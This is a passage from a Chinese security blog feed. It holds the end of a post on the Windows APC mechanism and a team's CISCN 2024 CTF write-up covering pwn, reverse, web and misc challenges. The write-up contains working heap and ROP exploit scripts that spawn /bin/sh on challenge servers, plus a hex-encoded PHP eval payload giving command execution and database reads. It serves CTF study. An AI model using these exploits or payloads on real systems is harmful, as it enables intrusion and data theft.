class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">DWORD subthreadid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode1\n&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(INFINITE,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    hThread = <span class="built_in">GetCurrentThread</span>();</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode1, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">QueueUserAPC</span>((PAPCFUNC)shellcode2, hThread, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;helloworld\n&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(INFINITE,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段示例中也可以看出来，APC 可以被另一个 APC 中断。并且这里发现，如果删掉 shellcode1 中的 SleepEx 语句，则 shellcode2 同样会被执行。说明当线程处于 alertable 状态时，线程会尝试执行完所有的 APC（用户状态下）。</p><p>如果在执行 APC 函数的情况下插入了另一个 APC，则按照先进先出的顺序，直到执行完所有的 APC。当然，在第一个 SleepEx 返回之后，线程会从 alertable 状态中取消，在这之后插入 APC 则需要再次等待线程进入 alertable 状态。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章大概探索了一下 APC 这个有趣的机制，学跑先学走，学走先学爬。这里先简单了解一下用户 APC 的一些小东西，熟悉一下大概的机制，后面再去深入研究一些线程相关 API 和内核 APC 等。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1] <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/types-of-apcs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/types-of-apcs</a></li><li>[2] <a href="https://www.cnblogs.com/wingsummer/p/15862919.html">https://www.cnblogs.com/wingsummer/p/15862919.html</a></li><li>[3] <a href="https://www.anquanke.com/post/id/254026">https://www.anquanke.com/post/id/254026</a></li><li>[4] <a href="https://dennisbabkin.com/inside_nt_apc/">https://dennisbabkin.com/inside_nt_apc/</a></li><li>[5] <a href="https://bbs.kanxue.com/thread-261589.htm">https://bbs.kanxue.com/thread-261589.htm</a></li></ul>]]></content>
    
    
    <summary type="html">学习一下Windows的APC机制</summary>
    
    
    
    <category term="ctf" scheme="https://xia0ji233.github.io/categories/ctf/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="reverse" scheme="https://xia0ji233.github.io/categories/ctf/reverse/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>CISCN2024 初赛WP</title>
    <link href="https://xia0ji233.github.io/2024/05/19/CISCN2024/"/>
    <id>https://xia0ji233.github.io/2024/05/19/CISCN2024/</id>
    <published>2024-05-19T14:00:00.000Z</published>
    <updated>2024-05-19T14:33:41.185Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下CISCN2024的初赛</p><span id="more"></span><h1 id="WoodpeckerT1战队WRITEUP"><a href="#WoodpeckerT1战队WRITEUP" class="headerlink" title="WoodpeckerT1战队WRITEUP"></a>WoodpeckerT1战队WRITEUP</h1><h2 id="战队信息"><a href="#战队信息" class="headerlink" title="战队信息"></a>战队信息</h2><p>战队名称：WoodpeckerT1</p><p>战队排名：104</p><img src="/2024/05/19/CISCN2024/rank.png" class=""><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="orange-cat-diary"><a href="#orange-cat-diary" class="headerlink" title="orange_cat_diary"></a>orange_cat_diary</h3><p>经典堆题目，题目提示了 orange，想到 house of orange 的攻击手法，题目允许在再次编辑的时候溢出 8 个字节，show 和 free 的次数有限，因此先通过 house of orange 改变 topchunk 的 size。然后申请比 topchunk 更大的堆块，此时 topchunk 就会被 free 进入 unsorted chunk，再次申请并打印内容可以获得 glibc 的地址。然后就是利用 uaf 漏洞触发 fastbin attack 劫持 <code>__malloc_hook-0x23</code> 处的堆块，给 <code>malloc_hook</code> 写入 one_gadget 的地址。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./orange_cat_diary&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;8.147.128.96&#x27;</span>,<span class="number">13755</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/xia0ji233/pwn/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>,<span class="string">&#x27;xia0ji233&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">choice(<span class="number">2</span>)</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">1640</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">one=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">choice(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">0x10</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(libc_addr+one[<span class="number">2</span>]))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b malloc&#x27;</span>)</span><br><span class="line">choice(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="go-stack"><a href="#go-stack" class="headerlink" title="go_stack"></a>go_stack</h3><p>go的pwn虽然没有接触过，但是题目运行逻辑非常简单。这里可以用 pwndbg 的 cyclic 去确定溢出的位置。先生成很长的测试字符串 <code>cyclic 0x200</code>，输入之后得到 go 自带的返回地址错误，值为 <code>0x6361616161616169</code>。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic -l <span class="string">&#x27;iaaaaaac&#x27;</span></span><br><span class="line">Finding cyclic pattern of 8 bytes: b<span class="string">&#x27;iaaaaaac&#x27;</span> (hex: 0x6961616161616163)</span><br><span class="line">Found at offset 464</span><br></pre></td></tr></table></figure><p>随后就是构造 ROP 链，利用 ROPgadget 工具找到 gadget 位置即可开打。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">frompwnimport*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">file_name=<span class="string">&#x27;./gostack&#x27;</span></span><br><span class="line">elf=ELF(file_name)</span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="comment">#p=process(file_name)</span></span><br><span class="line">p=remote(<span class="string">&#x27;8.147.133.63&#x27;</span>,<span class="number">12953</span>)</span><br><span class="line">syscall=<span class="number">0x0000000000404043</span></span><br><span class="line">rax_ret=<span class="number">0x000000000040f984</span></span><br><span class="line">rdi_6_ret=<span class="number">0x00000000004a18a5</span></span><br><span class="line">rsi_ret=<span class="number">0x000000000042138a</span></span><br><span class="line">rdx_ret=<span class="number">0x00000000004944ec</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message:&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(elf.bss())+p64(<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">0x18</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(rsi_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(rdx_ret)+p64(<span class="number">0x100</span>)+p64(rax_ret)+p64(<span class="number">0</span>)+p64(syscall)</span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">payload+=p64(rdi_6_ret)+p64(elf.bss()+<span class="number">0x200</span>)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(rax_ret)+p64(<span class="number">59</span>)+p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">time.sleep(<span class="number">2</span>)</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="asm-re"><a href="#asm-re" class="headerlink" title="asm_re"></a>asm_re</h3><p>程序对两个变量进行加乘和异或操作</p><img src="/2024/05/19/CISCN2024/5.png" class=""><p>找到数据存储位置</p><img src="/2024/05/19/CISCN2024/6.png" class=""><p>对十六进制数据逆向操作，先加30再进行异或，减20后除80</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">s = s.split(&quot;\n&quot;)</span><br><span class="line">l = []</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(len(s)):</span><br><span class="line">    x = s[i].split(&quot; &quot;)[1]</span><br><span class="line">    l.append(x)</span><br><span class="line">for i in range(0, len(l), 4):</span><br><span class="line">    x = l[i:i + 4]</span><br><span class="line">    p = int(x[1] + x[0], 16)</span><br><span class="line">    flag += chr((((p - 30) ^ 0x4d) - 20) // 80)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>s为原始数据此处省略</p><h3 id="whereThel1b"><a href="#whereThel1b" class="headerlink" title="whereThel1b"></a>whereThel1b</h3><p>给的附件可以直接运行，多次尝试发现只有调用 trytry 函数是校验的，可以算出密文列表，多次修改发现，单个密文只能影响1到2个字节，于是可以尝试手动爆破，在字符集当中进行遍历，观测密文是否一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> whereThel1b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = input(&quot;where is my flag:&quot;)</span></span><br><span class="line"><span class="comment"># flag = flag.encode()</span></span><br><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"><span class="comment">#whereThel1b.whereistheflag(flag)</span></span><br><span class="line">flagprefix=<span class="string">&#x27;flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;&#x27;</span></span><br><span class="line">flagsuffix=<span class="string">&#x27;a&#x27;</span>*(<span class="number">42</span>-<span class="built_in">len</span>(flagprefix)-<span class="number">1</span>)</span><br><span class="line">l=<span class="number">56</span></span><br><span class="line">t=<span class="string">&#x27;0123456789abcdef-&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> t:</span><br><span class="line">    flag=flagprefix+i+flagsuffix</span><br><span class="line">    flag=flag.encode()</span><br><span class="line">    <span class="comment"># whereThel1b.whereistheflag(flag)</span></span><br><span class="line">    ret = whereThel1b.trytry(flag)</span><br><span class="line">    <span class="keyword">if</span> ret[:l]==encry[:l]:</span><br><span class="line">        <span class="built_in">print</span>(ret[<span class="number">40</span>:],<span class="built_in">len</span>(ret))</span><br><span class="line">        <span class="built_in">print</span>(encry[<span class="number">40</span>:],<span class="built_in">len</span>(encry))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="comment"># break</span></span><br></pre></td></tr></table></figure><p>有些地方会有多个可能的字符，因此需要调大参数 <code>l</code> 一个一个试过去，最后得到了正确的 flag。</p><h3 id="gdb-debug"><a href="#gdb-debug" class="headerlink" title="gdb_debug"></a>gdb_debug</h3><p>这题经过仔细地调试还是发现基本单字节模式的加密，于是也爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">target=<span class="string">b&#x27;congratulationstoyoucongratulationstoy&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare</span>(<span class="params">s1,s2</span>):</span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s1)):</span><br><span class="line">        <span class="keyword">if</span> s1[i]==s2[i]:</span><br><span class="line">            cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> cnt</span><br><span class="line">model=<span class="string">&#x27;flag&#123;78bace5989660ee38f1fd980xxxxxxxx&#125;&#x27;</span></span><br><span class="line">now=<span class="number">6</span>+<span class="number">24</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">if</span> model[i]!=<span class="string">&#x27;x&#x27;</span>:<span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x21</span>,<span class="number">0x7f</span>):</span><br><span class="line">        flag=model[:i]+<span class="built_in">chr</span>(k)+model[i+<span class="number">1</span>:]</span><br><span class="line">        p=process(<span class="string">&#x27;./gdb_debug&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;Please enter the flag string (ensuring the format is &#x27;flag&#123;&#125;&#x27; and the total length is 38 characters).&quot;</span>,flag)</span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recvline()</span><br><span class="line">        s=p.recvuntil(<span class="string">&#x27;Error&#x27;</span>)[:-<span class="number">6</span>]</span><br><span class="line">        <span class="keyword">if</span> compare(s,target)==now+<span class="number">1</span>:</span><br><span class="line">            model=model[:i]+<span class="built_in">chr</span>(k)+model[i+<span class="number">1</span>:]</span><br><span class="line">            now+=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(model)</span><br><span class="line">            p.shutdown()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        p.shutdown()</span><br><span class="line"><span class="comment">#flag&#123;78bace5989660ee38f1fd980a4b4fbcd&#125;</span></span><br></pre></td></tr></table></figure><p>now变量控制当前有几个字符是密文一样的，因为没有控制字符集，一次运行不完（进程太多了），但是每次都会输出结果，因此分多次跑很快可以跑完。</p><p>这里需要patch原来的程序，将 strcmp 改为输出密文字符串。</p><img src="/2024/05/19/CISCN2024/1.png" class=""><p>E8 84 字节 改为 E8 44 （即把strcmp的plt改成puts的plt偏移）</p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>反编译得到AES加密密文</p><img src="/2024/05/19/CISCN2024/7.png" class=""><p>使用Frida进行hook得到key和iv</p><figure class="highlight plaintext"><figcaption><span>脚本</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">function main() &#123;</span><br><span class="line">    Java.perform(function () &#123;</span><br><span class="line">        var jni = Java.use(&quot;com.example.re11113.jni&quot;);</span><br><span class="line">        jni.getkey.overload().implementation = function () &#123;</span><br><span class="line">            var key = this.getkey();</span><br><span class="line">            var iv = this.getiv();</span><br><span class="line">            console.log(&quot;Key:&quot;, key);</span><br><span class="line">            console.log(&quot;iv:&quot;, iv);</span><br><span class="line">            sead(&quot;Key:&quot;, key);</span><br><span class="line"></span><br><span class="line">            return key;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main);</span><br><span class="line">import frida</span><br><span class="line">import sys</span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#x27;type&#x27;] == &#x27;send&#x27;:</span><br><span class="line">        print(message[&#x27;payload&#x27;])</span><br><span class="line">        print(&quot;&#123;0&#125;&quot;.format(message[&#x27;payload&#x27;]))</span><br><span class="line">    else:</span><br><span class="line">        print(str(message))</span><br><span class="line">with open(&#x27;code.js&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">    js_code = f.read()</span><br><span class="line">session = frida.get_remote_device().attach(&#x27;Re11113&#x27;)</span><br><span class="line">script = session.create_script(js_code)</span><br><span class="line">script.on(&#x27;message&#x27;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>得到key和iv</p><img src="/2024/05/19/CISCN2024/8.png" class=""><p>使用key和iv解密得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">from Crypto.Cipher import DES</span><br><span class="line">from Crypto.Util.Padding import unpad</span><br><span class="line"></span><br><span class="line">def encode(encrypted_message, key, iv):</span><br><span class="line">        cipher = DES.new(key, DES.MODE_CBC, iv)</span><br><span class="line">        decrypted_bytes = cipher.decrypt(base64.b64decode(encrypted_message))</span><br><span class="line">        decrypted_message = unpad(decrypted_bytes, DES.block_size).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        return decrypted_message</span><br><span class="line">enmessage = &quot;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&quot;</span><br><span class="line">key = b&#x27;A8UdWaeq&#x27;</span><br><span class="line">iv = b&#x27;Wf3DLups&#x27;</span><br><span class="line">demessage = encode(enmessage, key, iv)</span><br><span class="line">print(demessage)</span><br></pre></td></tr></table></figure><img src="/2024/05/19/CISCN2024/9.png" class=""><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h3><p>读源码发现没有过滤php，传入php –version发现可以执行</p><img src="/2024/05/19/CISCN2024/2.png" class=""><p>没有过滤eval，但过滤base64和url，尝试使用16进制编码,首先尝试执行系统命令，对whoami编码得到6563686F206077686F616D69603B，但单引号和双引号被过滤，加上_得到_6563686F206077686F616D69603B，发现可以RCE</p><img src="/2024/05/19/CISCN2024/3.png" class=""><p>在数据库中发现flag，payload：Echo <code>mysql -u root -p ‘root’ -e ‘use PHP_CMS;select * from F1ag_Se3Re7;’</code>;</p><p>进行十六进制编码得到<br>cmd&#x3D;php -r eval(hex2bin(substr(_6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73686f77207461626c65733b73656c656374202a2066726f6d20463161675f5365335265373b27603b,1)));</p><img src="/2024/05/19/CISCN2024/4.png" class=""><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="打卡"><a href="#打卡" class="headerlink" title="打卡"></a>打卡</h3><p>答完题发现直接给了flag</p><img src="/2024/05/19/CISCN2024/10.png" class=""><h3 id="盗版软件"><a href="#盗版软件" class="headerlink" title="盗版软件"></a>盗版软件</h3><p>根据题目描述可知dmp为浏览器文件，更改后缀为data原始数据，gimp调整位移</p><img src="/2024/05/19/CISCN2024/11.png" class=""><p>得到域名winhack.com，虚拟机中双击exe运行出一张图片，zsteg大致看了下发现lsb确实有东西，用stegsolve细致看看</p><img src="/2024/05/19/CISCN2024/12.png" class=""><p>发现red全通道有个压缩包，但是文件被间隔开了，利用脚本进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 